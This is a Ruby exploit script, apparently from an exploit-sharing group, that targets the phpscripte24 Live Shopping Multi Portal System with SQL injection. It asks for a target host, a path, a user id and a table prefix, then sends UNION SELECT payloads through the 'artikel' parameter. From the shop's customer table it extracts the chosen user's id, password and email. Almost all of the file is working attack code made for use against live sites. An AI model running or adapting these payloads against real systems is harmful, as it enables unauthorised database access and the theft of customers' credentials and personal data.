#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
#  phpscripte24 Live Shopping Multi Portal System SQL   #
#                    Injection Exploit                  #
#               Using Host+Path+userid+prefix           #
#                   demo.com /shop/ 1 L_kunden          #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/shop/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
print "\nEnter prefix (prefix z.b L_kunden)->"
prefix=gets.chomp
print ""+ block +""
begin
dir = "index.php?seite=2&artikel=99999999999+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23),3,4,5,6,7,8,9,10,11,12,13,14,15+from+"+ prefix +"+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?seite=2&artikel=99999999999+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,passwort,0x23,0x23,0x23,0x23,0x23),3,4,5,6,7,8,9,10,11,12,13,14,15+from+"+ prefix +"+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?seite=2&artikel=99999999999+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23),3,4,5,6,7,8,9,10,11,12,13,14,15+from+"+ prefix +"+where+id="+ userid +"--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end